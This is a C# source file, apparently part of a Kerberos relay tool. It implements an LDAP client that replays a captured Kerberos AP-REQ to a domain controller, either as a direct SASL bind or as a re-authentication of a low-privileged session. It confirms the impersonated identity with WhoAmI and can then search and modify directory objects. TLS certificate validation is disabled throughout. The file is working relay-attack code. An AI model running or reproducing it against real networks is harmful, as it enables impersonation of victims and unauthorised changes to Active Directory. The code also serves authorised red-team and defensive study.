using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;

namespace KrbRelay.Clients
{
    /// <summary>
    /// Minimal managed LDAP client used to relay a captured Kerberos AP-REQ to a domain controller.
    ///
    /// Two modes:
    ///   direct   : one SASL GSS-SPNEGO bind carrying the relayed ticket.
    ///   -reauth  : bind first with a known low privileged account, then send the relayed ticket as an
    ///              RFC 4513 section 5.2 re-authentication on the already authenticated connection.
    ///
    /// Unlike SMB there is no per-session signing key to preserve: the AP-REQ (with its authenticator) is
    /// self authenticating, so the re-bind is protocol parity with the SMB -reauth switch, not a bypass of a
    /// domain controller control. "LDAP server signing requirements" applies to simple/NTLM binds, not to
    /// Kerberos SASL binds.
    /// </summary>
    public class LdapRelayClient : IDisposable
    {
        private const string WhoAmIOid = "1.3.6.1.4.1.4203.1.11.3";
        private const string StartTlsOid = "1.3.6.1.4.1.1466.20037";

        // OID 1.3.6.1.5.5.2 (SPNEGO) in DER, used to pick the SASL mechanism
        private static readonly byte[] SpnegoOidDer = { 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02 };

        private Socket _socket;
        private Stream _stream;
        private Stream _networkStream;
        private string _host;
        private int _port;
        private bool _isTls;
        private int _messageID;

        public string Mechanism { get; private set; } = "";

        /// <summary>Hex dump every LDAP frame sent and received (-ldapdebug).</summary>
        public bool Trace { get; set; }

        public bool IsTls
        {
            get { return _isTls; }
        }

        /// <summary>Adjusts the socket receive timeout (ms) for the operations that follow a bind.</summary>
        public void SetReceiveTimeout(int milliseconds)
        {
            if (_socket != null)
            {
                _socket.ReceiveTimeout = milliseconds;
            }
        }

        public bool Connect(string host, int port, bool useSsl, out string error)
        {
            _host = host;
            _port = port;
            return Open(useSsl, out error);
        }

        private bool Open(bool useSsl, out string error)
        {
            error = null;
            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveTimeout = 15000,
                    SendTimeout = 15000
                };
                _socket.Connect(_host, _port);

                _networkStream = new NetworkStream(_socket, false);
                _stream = _networkStream;
                _isTls = false;
                _messageID = 0;                     // message ids are per-connection

                if (useSsl)
                {
                    SslStream ssl = new SslStream(_networkStream, false, (sender, cert, chain, errors) => true);
                    ssl.AuthenticateAsClient(_host);
                    _stream = ssl;
                    _isTls = true;
                }
                return true;
            }
            catch (Exception e)
            {
                error = e.Message;
                Dispose();
                return false;
            }
        }

        /// <summary>
        /// RFC 4511/4513 StartTLS on the plaintext port: reconnects, sends the extended request
        /// 1.3.6.1.4.1.1466.20037 and wraps the socket in TLS. Needed on domain controllers that enforce
        /// LDAP server signing, because a simple bind without integrity is refused with
        /// strongAuthRequired (8) / unwillingToPerform (53) on an unencrypted connection.
        /// </summary>
        public bool StartTls(out string error)
        {
            error = null;
            try
            {
                Dispose();
                if (!Open(false, out error))
                {
                    return false;
                }

                byte[] extendedRequest = Tlv(0x77, Tlv(0x80, Encoding.ASCII.GetBytes(StartTlsOid)));
                int resultCode = SendAndReadResult(extendedRequest, 0x78, out string diagnostic, out _);
                if (resultCode != 0)
                {
                    error = string.Format("server refused StartTLS: {0} ({1}) {2}", ResultText(resultCode), resultCode, diagnostic);
                    return false;
                }

                SslStream ssl = new SslStream(_networkStream, false, (sender, cert, chain, errors) => true);
                ssl.AuthenticateAsClient(_host);
                _stream = ssl;
                _isTls = true;
                return true;
            }
            catch (Exception e)
            {
                error = e.Message;
                return false;
            }
        }

        /// <summary>
        /// SASL bind carrying the relayed GSS-API token. Used both as the initial bind and, when -reauth is
        /// set, as the re-authentication on an already bound connection (same BindRequest on the wire).
        /// </summary>
        public int BindSaslGssApi(byte[] token, out string diagnostic)
        {
            return BindSaslGssApi(token, null, out diagnostic);
        }

        /// <summary>
        /// SASL bind with an explicit mechanism override ("GSS-SPNEGO" or "GSSAPI"). Pass null to auto-detect
        /// from the token (SPNEGO OID present => GSS-SPNEGO).
        /// </summary>
        public int BindSaslGssApi(byte[] token, string mechanism, out string diagnostic)
        {
            if (_stream == null)
            {
                diagnostic = "not connected";
                return -1;
            }

            Mechanism = !string.IsNullOrEmpty(mechanism)
                ? mechanism
                : (Contains(token, SpnegoOidDer) ? "GSS-SPNEGO" : "GSSAPI");

            // RFC 4511 uses IMPLICIT TAGS: [3] SaslCredentials replaces the SaslCredentials SEQUENCE tag,
            // so the mechanism/value octet strings follow the A3 tag directly. Emitting an extra SEQUENCE
            // here makes the bind unparseable and Windows drops the connection (TCP reset, no LDAP reply).
            byte[] saslCredentials = Combine(
                OctetString(Encoding.ASCII.GetBytes(Mechanism)),
                OctetString(token));

            byte[] bindRequest = Tlv(0x60, Combine(             // [APPLICATION 0] BindRequest (replaces SEQUENCE)
                Integer(3),                                     // version
                OctetString(Array.Empty<byte>()),               // empty DN for SASL
                Tlv(0xA3, saslCredentials)));                   // [3] SaslCredentials

            return SendAndReadResult(bindRequest, 0x61, out diagnostic, out _);
        }

        /// <summary>
        /// Plain simple bind used to open the base session for -reauth. Over plaintext 389 a domain
        /// controller that enforces LDAP signing will answer 8 (strongAuthRequired) or 53: use -ssl then.
        /// </summary>
        public int BindSimple(string domain, string user, string password, out string diagnostic)
        {
            if (_stream == null)
            {
                diagnostic = "not connected";
                return -1;
            }

            string name = domain.Contains(".")
                ? string.Format("{0}@{1}", user, domain)
                : string.Format("{0}\\{1}", domain, user);

            byte[] bindRequest = Tlv(0x60, Combine(             // [APPLICATION 0] BindRequest (replaces SEQUENCE)
                Integer(3),                                     // version
                OctetString(Encoding.UTF8.GetBytes(name)),
                Tlv(0x80, Encoding.UTF8.GetBytes(password))));   // [0] simple

            return SendAndReadResult(bindRequest, 0x61, out diagnostic, out _);
        }

        /// <summary>
        /// Extended operation 1.3.6.1.4.1.4203.1.11.3: returns the authorization identity of the current
        /// bind, e.g. "u:DOMAIN\user". Used to prove which identity the relayed ticket produced.
        /// </summary>
        public string WhoAmI(out int resultCode, out string diagnostic)
        {
            resultCode = -1;
            diagnostic = "";
            if (_stream == null)
            {
                diagnostic = "not connected";
                return null;
            }

            byte[] extendedRequest = Tlv(0x77, Combine(             // [APPLICATION 23] ExtendedRequest (replaces SEQUENCE)
                Tlv(0x80, Encoding.ASCII.GetBytes(WhoAmIOid))));    // [0] requestName

            resultCode = SendAndReadResult(extendedRequest, 0x78, out diagnostic, out byte[] responseValue);
            if (resultCode != 0 || responseValue == null)
            {
                return null;
            }
            return Encoding.UTF8.GetString(responseValue);
        }

        public static string ResultText(int code)
        {
            switch (code)
            {
                case 0: return "success";
                case 1: return "operationsError";
                case 2: return "protocolError";
                case 3: return "timeLimitExceeded";
                case 8: return "strongAuthRequired";
                case 12: return "unavailableCriticalExtension";
                case 14: return "saslBindInProgress";
                case 32: return "noSuchObject";
                case 49: return "invalidCredentials";
                case 50: return "insufficientAccessRights";
                case 52: return "unavailable";
                case 53: return "unwillingToPerform";
                case 65: return "objectClassViolation";
                case 80: return "other";
                case -1: return "transportError";
                default: return "unknown";
            }
        }

        // ---- search / modify ---------------------------------------------------------------------

        /// <summary>
        /// Sends an LDAP search and collects every SearchResultEntry until SearchResultDone.
        /// scope: 0 = base object, 1 = single level, 2 = whole subtree.
        /// </summary>
        public int Search(string baseDn, int scope, byte[] filter, string[] attributes, List<LdapEntry> entries, out string diagnostic)
        {
            diagnostic = "";
            if (_stream == null)
            {
                diagnostic = "not connected";
                return -1;
            }

            List<byte[]> attributeList = new List<byte[]>();
            if (attributes != null)
            {
                foreach (string attribute in attributes)
                {
                    attributeList.Add(OctetString(Encoding.UTF8.GetBytes(attribute)));
                }
            }

            byte[] searchRequest = Tlv(0x63, Combine(                    // [APPLICATION 3] SearchRequest
                OctetString(Encoding.UTF8.GetBytes(baseDn ?? "")),
                Tlv(0x0A, new byte[] { (byte)scope }),                   // scope
                Tlv(0x0A, new byte[] { 0x00 }),                          // derefAliases: never
                Integer(0),                                              // sizeLimit
                Integer(30),                                             // timeLimit
                Tlv(0x01, new byte[] { 0x00 }),                          // typesOnly: FALSE
                filter,
                Tlv(0x30, Combine(attributeList.ToArray()))));           // attributes

            int messageID = ++_messageID;
            byte[] message = Tlv(0x30, Combine(Integer(messageID), searchRequest));
            try
            {
                WriteMessage(message);
            }
            catch (Exception e)
            {
                diagnostic = "send failed: " + e.Message;
                return -1;
            }

            while (true)
            {
                byte[] response;
                try
                {
                    response = ReadMessage();
                }
                catch (Exception e)
                {
                    diagnostic = "receive failed: " + e.Message;
                    return -1;
                }

                if (response == null)
                {
                    diagnostic = "connection closed by server";
                    return -1;
                }

                int resultCode;
                bool done;
                if (!TryParseSearchMessage(response, messageID, entries, out resultCode, out done, out diagnostic))
                {
                    return -1;
                }
                if (done)
                {
                    return resultCode;
                }
            }
        }

        /// <summary>LDAP Modify (operation: 0 add, 1 delete, 2 replace).</summary>
        public int Modify(string dn, IEnumerable<LdapModification> modifications, out string diagnostic)
        {
            if (_stream == null)
            {
                diagnostic = "not connected";
                return -1;
            }

            List<byte[]> changes = new List<byte[]>();
            foreach (LdapModification modification in modifications)
            {
                List<byte[]> values = new List<byte[]>();
                foreach (byte[] value in modification.Values)
                {
                    values.Add(OctetString(value));
                }

                byte[] partialAttribute = Tlv(0x30, Combine(
                    OctetString(Encoding.UTF8.GetBytes(modification.Attribute)),
                    Tlv(0x31, Combine(values.ToArray()))));

                changes.Add(Tlv(0x30, Combine(
                    Tlv(0x0A, new byte[] { (byte)modification.Operation }),
                    partialAttribute)));
            }

            byte[] modifyRequest = Tlv(0x66, Combine(                    // [APPLICATION 6] ModifyRequest
                OctetString(Encoding.UTF8.GetBytes(dn)),
                Tlv(0x30, Combine(changes.ToArray()))));

            return SendAndReadResult(modifyRequest, 0x67, out diagnostic, out _);
        }

        /// <summary>Reads defaultNamingContext from the root DSE (base scope search on "").</summary>
        public string GetDefaultNamingContext(out int resultCode, out string diagnostic)
        {
            List<LdapEntry> entries = new List<LdapEntry>();
            resultCode = Search("", 0, LdapFilter.Present("objectClass"), new[] { "defaultNamingContext" }, entries, out diagnostic);
            if (resultCode != 0 || entries.Count == 0)
            {
                return null;
            }
            return entries[0].GetString("defaultNamingContext");
        }

        /// <summary>Subtree search by sAMAccountName, retrying with a trailing '$' for machine accounts.</summary>
        public LdapEntry FindObject(string baseDn, string samAccountName, string[] attributes, out int resultCode, out string diagnostic)
        {
            List<LdapEntry> entries = new List<LdapEntry>();
            resultCode = Search(baseDn, 2, LdapFilter.Equality("sAMAccountName", samAccountName), attributes, entries, out diagnostic);
            if (resultCode == 0 && entries.Count > 0)
            {
                return entries[0];
            }

            if (resultCode == 0 && !samAccountName.EndsWith("$", StringComparison.Ordinal))
            {
                entries.Clear();
                resultCode = Search(baseDn, 2, LdapFilter.Equality("sAMAccountName", samAccountName + "$"), attributes, entries, out diagnostic);
                if (resultCode == 0 && entries.Count > 0)
                {
                    return entries[0];
                }
            }
            return null;
        }

        /// <summary>Binary SID (as stored in objectSid) to its S-1-5-... string form.</summary>
        public static string BinarySidToString(byte[] sid)
        {
            if (sid == null || sid.Length < 8)
            {
                return null;
            }

            int revision = sid[0];
            int subAuthorityCount = sid[1];
            if (sid.Length < 8 + subAuthorityCount * 4)
            {
                return null;
            }

            long identifierAuthority = 0;
            for (int i = 2; i < 8; i++)
            {
                identifierAuthority = (identifierAuthority << 8) | sid[i];
            }

            StringBuilder builder = new StringBuilder();
            builder.Append("S-").Append(revision).Append('-').Append(identifierAuthority);
            for (int i = 0; i < subAuthorityCount; i++)
            {
                uint subAuthority = (uint)(sid[8 + i * 4] |
                                           (sid[9 + i * 4] << 8) |
                                           (sid[10 + i * 4] << 16) |
                                           (sid[11 + i * 4] << 24));
                builder.Append('-').Append(subAuthority);
            }
            return builder.ToString();
        }

        /// <summary>S-1-5-... string SID to its binary form.</summary>
        public static byte[] StringToBinarySid(string sid)
        {
            string[] parts = sid.Split('-');
            if (parts.Length < 3 || parts[0] != "S")
            {
                throw new FormatException("invalid SID: " + sid);
            }

            int revision = int.Parse(parts[1]);
            long identifierAuthority = long.Parse(parts[2]);
            int subAuthorityCount = parts.Length - 3;

            byte[] binary = new byte[8 + subAuthorityCount * 4];
            binary[0] = (byte)revision;
            binary[1] = (byte)subAuthorityCount;
            for (int i = 0; i < 6; i++)
            {
                binary[2 + i] = (byte)(identifierAuthority >> (8 * (5 - i)));
            }
            for (int i = 0; i < subAuthorityCount; i++)
            {
                uint subAuthority = uint.Parse(parts[3 + i]);
                binary[8 + i * 4] = (byte)(subAuthority & 0xFF);
                binary[9 + i * 4] = (byte)((subAuthority >> 8) & 0xFF);
                binary[10 + i * 4] = (byte)((subAuthority >> 16) & 0xFF);
                binary[11 + i * 4] = (byte)((subAuthority >> 24) & 0xFF);
            }
            return binary;
        }

        private static bool TryParseSearchMessage(byte[] message, int expectedID, List<LdapEntry> entries, out int resultCode, out bool done, out string diagnostic)
        {
            resultCode = -1;
            done = false;
            diagnostic = "";

            int offset = 0;
            if (!TryReadTlv(message, ref offset, out byte tag, out int seqOffset, out int seqLength) || tag != 0x30)
            {
                diagnostic = "malformed LDAPMessage";
                return false;
            }

            int child = seqOffset;
            int end = seqOffset + seqLength;

            if (!TryReadTlv(message, ref child, out byte idTag, out int idOffset, out int idLength) || idTag != 0x02)
            {
                diagnostic = "malformed LDAPMessage (messageID)";
                return false;
            }

            int messageID = 0;
            for (int i = 0; i < idLength; i++)
            {
                messageID = (messageID << 8) | message[idOffset + i];
            }
            if (messageID != expectedID)
            {
                return true;
            }

            if (child >= end || !TryReadTlv(message, ref child, out byte opTag, out int opOffset, out int opLength))
            {
                diagnostic = "malformed LDAPMessage (protocolOp)";
                return false;
            }

            if (opTag == 0x64)
            {
                return TryParseSearchEntry(message, opOffset, opLength, entries, out diagnostic);
            }

            if (opTag == 0x65) // SearchResultDone
            {
                done = true;
                int field = opOffset;
                int opEnd = opOffset + opLength;
                if (!TryReadTlv(message, ref field, out byte rcTag, out int rcOffset, out int rcLength) || rcTag != 0x0A)
                {
                    diagnostic = "malformed SearchResultDone";
                    return false;
                }
                int rc = 0;
                for (int i = 0; i < rcLength; i++)
                {
                    rc = (rc << 8) | message[rcOffset + i];
                }
                resultCode = rc;
                if (field < opEnd && TryReadTlv(message, ref field, out _, out _, out _)) { }
                if (field < opEnd && TryReadTlv(message, ref field, out byte diagTag, out int diagOffset, out int diagLength) && diagTag == 0x04)
                {
                    diagnostic = Encoding.UTF8.GetString(message, diagOffset, diagLength);
                }
                return true;
            }

            // referrals (0x73) and anything else are ignored
            return true;
        }

        private static bool TryParseSearchEntry(byte[] message, int opOffset, int opLength, List<LdapEntry> entries, out string diagnostic)
        {
            diagnostic = "";
            LdapEntry entry = new LdapEntry();

            int field = opOffset;
            int opEnd = opOffset + opLength;

            if (!TryReadTlv(message, ref field, out byte dnTag, out int dnOffset, out int dnLength) || dnTag != 0x04)
            {
                diagnostic = "malformed SearchResultEntry (objectName)";
                return false;
            }
            entry.Dn = Encoding.UTF8.GetString(message, dnOffset, dnLength);

            if (field < opEnd && TryReadTlv(message, ref field, out byte listTag, out int listOffset, out int listLength) && listTag == 0x30)
            {
                int attributeOffset = listOffset;
                int attributeEnd = listOffset + listLength;
                while (attributeOffset < attributeEnd &&
                       TryReadTlv(message, ref attributeOffset, out byte attributeTag, out int attributeValueOffset, out int attributeValueLength) &&
                       attributeTag == 0x30)
                {
                    int part = attributeValueOffset;
                    int partEnd = attributeValueOffset + attributeValueLength;

                    if (!TryReadTlv(message, ref part, out byte nameTag, out int nameOffset, out int nameLength) || nameTag != 0x04)
                    {
                        continue;
                    }
                    string attributeName = Encoding.UTF8.GetString(message, nameOffset, nameLength);

                    List<byte[]> values = new List<byte[]>();
                    if (part < partEnd &&
                        TryReadTlv(message, ref part, out byte valueTag, out int valuesOffset, out int valuesLength) &&
                        valueTag == 0x31)
                    {
                        int valueOffset = valuesOffset;
                        int valuesEnd = valuesOffset + valuesLength;
                        while (valueOffset < valuesEnd &&
                               TryReadTlv(message, ref valueOffset, out byte itemTag, out int itemOffset, out int itemLength) &&
                               itemTag == 0x04)
                        {
                            byte[] value = new byte[itemLength];
                            Buffer.BlockCopy(message, itemOffset, value, 0, itemLength);
                            values.Add(value);
                        }
                    }
                    entry.Attributes[attributeName] = values;
                }
            }

            entries.Add(entry);
            return true;
        }

        private int SendAndReadResult(byte[] protocolOp, byte expectedResponseTag, out string diagnostic, out byte[] responseValue)
        {
            diagnostic = "";
            responseValue = null;

            int messageID = ++_messageID;
            byte[] message = Tlv(0x30, Combine(Integer(messageID), protocolOp));

            try
            {
                WriteMessage(message);
            }
            catch (Exception e)
            {
                diagnostic = "send failed: " + e.Message;
                return -1;
            }

            for (int attempt = 0; ; attempt++)
            {
                byte[] response;
                try
                {
                    response = ReadMessage();
                }
                catch (Exception e)
                {
                    diagnostic = "receive failed: " + e.Message;
                    return -1;
                }

                if (response == null)
                {
                    diagnostic = "connection closed by server";
                    return -1;
                }

                int responseID = PeekMessageID(response);
                // messageID 0 is an unsolicited notification (RFC 4511 4.4), typically a Notice of Disconnection:
                // report it rather than skipping it. Anything else with a foreign id is stale and ignored.
                if (responseID == messageID || responseID <= 0 || attempt >= 3)
                {
                    return ParseLdapResult(response, expectedResponseTag, out diagnostic, out responseValue);
                }
            }
        }

        private static int PeekMessageID(byte[] message)
        {
            int offset = 0;
            if (!TryReadTlv(message, ref offset, out byte tag, out int seqOffset, out int seqLength) || tag != 0x30)
            {
                return -1;
            }

            int child = seqOffset;
            if (!TryReadTlv(message, ref child, out byte idTag, out int idOffset, out int idLength) || idTag != 0x02)
            {
                return -1;
            }

            int messageID = 0;
            for (int i = 0; i < idLength; i++)
            {
                messageID = (messageID << 8) | message[idOffset + i];
            }
            return messageID;
        }

        /// <summary>
        /// Parses LDAPMessage ::= SEQUENCE { messageID, protocolOp, controls OPTIONAL }
        /// and the LDAPResult prefix shared by BindResponse and ExtendedResponse.
        /// </summary>
        private static int ParseLdapResult(byte[] message, byte expectedResponseTag, out string diagnostic, out byte[] responseValue)
        {
            diagnostic = "";
            responseValue = null;

            int offset = 0;
            if (!TryReadTlv(message, ref offset, out byte tag, out int seqOffset, out int seqLength) || tag != 0x30)
            {
                diagnostic = "malformed LDAPMessage";
                return -1;
            }

            int child = seqOffset;
            int end = seqOffset + seqLength;

            // messageID
            if (!TryReadTlv(message, ref child, out byte idTag, out _, out _) || idTag != 0x02)
            {
                diagnostic = "malformed LDAPMessage (messageID)";
                return -1;
            }

            // protocolOp
            if (child >= end || !TryReadTlv(message, ref child, out byte opTag, out int opOffset, out int opLength))
            {
                diagnostic = "malformed LDAPMessage (protocolOp)";
                return -1;
            }

            // Parse the LDAPResult fields even when the tag is not the one we expected, so that protocol
            // level errors (e.g. a Notice of Disconnection) are actually reported instead of swallowed.
            int field = opOffset;
            int opEnd = opOffset + opLength;
            int resultCode = -1;
            string serverText = "";
            string responseName = null;

            if (field < opEnd && TryReadTlv(message, ref field, out byte rcTag, out int rcOffset, out int rcLength) && rcTag == 0x0A)
            {
                resultCode = 0;
                for (int i = 0; i < rcLength; i++)
                {
                    resultCode = (resultCode << 8) | message[rcOffset + i];
                }
            }

            // matchedDN, diagnosticMessage
            if (field >= opEnd || !TryReadTlv(message, ref field, out _, out _, out _)) { }
            if (field < opEnd && TryReadTlv(message, ref field, out byte diagTag, out int diagOffset, out int diagLength) && diagTag == 0x04)
            {
                serverText = Encoding.UTF8.GetString(message, diagOffset, diagLength);
            }

            // optional trailing context tags: [7] serverSaslCreds, [10] responseName, [11] responseValue
            while (field < opEnd && TryReadTlv(message, ref field, out byte extraTag, out int extraOffset, out int extraLength))
            {
                if (extraTag == 0x8B)
                {
                    responseValue = new byte[extraLength];
                    Buffer.BlockCopy(message, extraOffset, responseValue, 0, extraLength);
                }
                else if (extraTag == 0x8A)
                {
                    responseName = Encoding.ASCII.GetString(message, extraOffset, extraLength);
                }
                else if (extraTag == 0x87 && resultCode == 14 && extraLength > 0)
                {
                    serverText = "server returned a SASL continuation token (unsupported by this client) " + serverText;
                }
            }

            if (opTag != expectedResponseTag)
            {
                if (opTag == 0x78 && responseName == "1.3.6.1.4.1.1466.20036")
                {
                    diagnostic = string.Format("server sent Notice of Disconnection (resultCode {0}): {1}", resultCode, serverText);
                }
                else
                {
                    diagnostic = string.Format(
                        "unexpected response tag 0x{0:X2} (expected 0x{1:X2}) resultCode={2} responseName='{3}' text='{4}' raw={5}",
                        opTag, expectedResponseTag, resultCode, responseName ?? "", serverText, ToHex(message, 96));
                }
                return -1;
            }

            diagnostic = serverText;
            return resultCode;
        }

        private static string ToHex(byte[] buffer, int maxBytes)
        {
            if (buffer == null)
            {
                return "";
            }
            int count = Math.Min(buffer.Length, maxBytes);
            StringBuilder builder = new StringBuilder(count * 2 + 4);
            for (int i = 0; i < count; i++)
            {
                builder.Append(buffer[i].ToString("x2"));
            }
            if (buffer.Length > count)
            {
                builder.Append("...");
            }
            return builder.ToString();
        }

        private byte[] ReadMessage()
        {
            using (MemoryStream buffer = new MemoryStream())
            {
                int tag = _stream.ReadByte();
                if (tag < 0)
                {
                    return null;
                }
                buffer.WriteByte((byte)tag);

                int first = _stream.ReadByte();
                if (first < 0)
                {
                    return null;
                }
                buffer.WriteByte((byte)first);

                int length;
                if ((first & 0x80) == 0)
                {
                    length = first;
                }
                else
                {
                    int count = first & 0x7F;
                    length = 0;
                    for (int i = 0; i < count; i++)
                    {
                        int lenByte = _stream.ReadByte();
                        if (lenByte < 0)
                        {
                            return null;
                        }
                        buffer.WriteByte((byte)lenByte);
                        length = (length << 8) | lenByte;
                    }
                }

                byte[] body = ReadExactly(length);
                if (body == null)
                {
                    return null;
                }
                buffer.Write(body, 0, body.Length);
                byte[] message = buffer.ToArray();
                if (Trace)
                {
                    Console.WriteLine("[ldap <<] {0} bytes: {1}", message.Length, ToHex(message, 512));
                }
                return message;
            }
        }

        private byte[] ReadExactly(int count)
        {
            byte[] buffer = new byte[count];
            int read = 0;
            while (read < count)
            {
                int n = _stream.Read(buffer, read, count - read);
                if (n <= 0)
                {
                    return null;
                }
                read += n;
            }
            return buffer;
        }

        private void WriteMessage(byte[] message)
        {
            if (Trace)
            {
                Console.WriteLine("[ldap >>] {0} bytes: {1}", message.Length, ToHex(message, 256));
            }
            _stream.Write(message, 0, message.Length);
            _stream.Flush();
        }

        // ---- minimal BER/DER helpers -------------------------------------------------------------

        internal static byte[] Tlv(byte tag, byte[] value)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                ms.WriteByte(tag);
                int length = value.Length;
                if (length < 0x80)
                {
                    ms.WriteByte((byte)length);
                }
                else
                {
                    List<byte> lengthBytes = new List<byte>();
                    int remaining = length;
                    while (remaining > 0)
                    {
                        lengthBytes.Insert(0, (byte)(remaining & 0xFF));
                        remaining >>= 8;
                    }
                    ms.WriteByte((byte)(0x80 | lengthBytes.Count));
                    foreach (byte b in lengthBytes)
                    {
                        ms.WriteByte(b);
                    }
                }
                ms.Write(value, 0, value.Length);
                return ms.ToArray();
            }
        }

        private static byte[] Integer(int value)
        {
            List<byte> bytes = new List<byte>();
            if (value == 0)
            {
                bytes.Add(0);
            }
            while (value > 0)
            {
                bytes.Insert(0, (byte)(value & 0xFF));
                value >>= 8;
            }
            if ((bytes[0] & 0x80) != 0)
            {
                bytes.Insert(0, 0);
            }
            return Tlv(0x02, bytes.ToArray());
        }

        internal static byte[] OctetString(byte[] value)
        {
            return Tlv(0x04, value);
        }

        internal static byte[] Combine(params byte[][] parts)
        {
            int total = 0;
            foreach (byte[] part in parts)
            {
                total += part.Length;
            }
            byte[] result = new byte[total];
            int offset = 0;
            foreach (byte[] part in parts)
            {
                Buffer.BlockCopy(part, 0, result, offset, part.Length);
                offset += part.Length;
            }
            return result;
        }

        private static bool TryReadTlv(byte[] buffer, ref int offset, out byte tag, out int valueOffset, out int length)
        {
            tag = 0;
            valueOffset = 0;
            length = 0;

            if (offset >= buffer.Length)
            {
                return false;
            }
            tag = buffer[offset++];

            if (offset >= buffer.Length)
            {
                return false;
            }
            int first = buffer[offset++];
            if ((first & 0x80) == 0)
            {
                length = first;
            }
            else
            {
                int count = first & 0x7F;
                if (count == 0 || offset + count > buffer.Length)
                {
                    return false;
                }
                for (int i = 0; i < count; i++)
                {
                    length = (length << 8) | buffer[offset++];
                }
            }

            valueOffset = offset;
            if (offset + length > buffer.Length)
            {
                return false;
            }
            offset += length;
            return true;
        }

        private static bool Contains(byte[] haystack, byte[] needle)
        {
            if (haystack == null || needle == null || needle.Length == 0 || haystack.Length < needle.Length)
            {
                return false;
            }
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                {
                    return true;
                }
            }
            return false;
        }

        public void Dispose()
        {
            try { _stream?.Dispose(); } catch { }
            try { _socket?.Dispose(); } catch { }
            _stream = null;
            _networkStream = null;
            _socket = null;
            _isTls = false;
        }
    }

    /// <summary>A SearchResultEntry.</summary>
    public class LdapEntry
    {
        public string Dn { get; set; } = "";
        public Dictionary<string, List<byte[]>> Attributes { get; } =
            new Dictionary<string, List<byte[]>>(StringComparer.OrdinalIgnoreCase);

        public string GetString(string attribute)
        {
            if (!Attributes.TryGetValue(attribute, out List<byte[]> values) || values.Count == 0 || values[0] == null)
            {
                return null;
            }
            return Encoding.UTF8.GetString(values[0]);
        }

        public List<string> GetStrings(string attribute)
        {
            List<string> result = new List<string>();
            if (Attributes.TryGetValue(attribute, out List<byte[]> values))
            {
                foreach (byte[] value in values)
                {
                    if (value != null)
                    {
                        result.Add(Encoding.UTF8.GetString(value));
                    }
                }
            }
            return result;
        }
    }

    /// <summary>A single entry of an LDAP ModifyRequest change list.</summary>
    public class LdapModification
    {
        public const int AddOperation = 0;
        public const int DeleteOperation = 1;
        public const int ReplaceOperation = 2;

        public int Operation { get; set; }
        public string Attribute { get; set; }
        public byte[][] Values { get; set; } = Array.Empty<byte[]>();

        public static LdapModification Add(string attribute, params byte[][] values)
        {
            return new LdapModification { Operation = AddOperation, Attribute = attribute, Values = values };
        }

        public static LdapModification Replace(string attribute, params byte[][] values)
        {
            return new LdapModification { Operation = ReplaceOperation, Attribute = attribute, Values = values };
        }

        public static LdapModification Delete(string attribute, params byte[][] values)
        {
            return new LdapModification { Operation = DeleteOperation, Attribute = attribute, Values = values };
        }
    }

    /// <summary>Minimal RFC 4515 filter encoder (implicit context tags, no inner SEQUENCE).</summary>
    public static class LdapFilter
    {
        public static byte[] And(params byte[][] filters)
        {
            return LdapRelayClient.Tlv(0xA0, LdapRelayClient.Combine(filters));
        }

        public static byte[] Or(params byte[][] filters)
        {
            return LdapRelayClient.Tlv(0xA1, LdapRelayClient.Combine(filters));
        }

        public static byte[] Equality(string attribute, string value)
        {
            return LdapRelayClient.Tlv(0xA3, LdapRelayClient.Combine(
                LdapRelayClient.OctetString(Encoding.UTF8.GetBytes(attribute)),
                LdapRelayClient.OctetString(Encoding.UTF8.GetBytes(Escape(value)))));
        }

        public static byte[] Present(string attribute)
        {
            return LdapRelayClient.Tlv(0x87, Encoding.UTF8.GetBytes(attribute));
        }

        /// <summary>RFC 4515 escaping of assertion values.</summary>
        public static string Escape(string value)
        {
            if (value == null)
            {
                return "";
            }

            StringBuilder builder = new StringBuilder();
            foreach (char c in value)
            {
                switch (c)
                {
                    case '\\': builder.Append(@"\5c"); break;
                    case '*': builder.Append(@"\2a"); break;
                    case '(': builder.Append(@"\28"); break;
                    case ')': builder.Append(@"\29"); break;
                    case '\0': builder.Append(@"\00"); break;
                    default:
                        if (c < 0x20 || c > 0x7E)
                        {
                            builder.Append('\\').Append(((int)c).ToString("x2"));
                        }
                        else
                        {
                            builder.Append(c);
                        }
                        break;
                }
            }
            return builder.ToString();
        }
    }
}
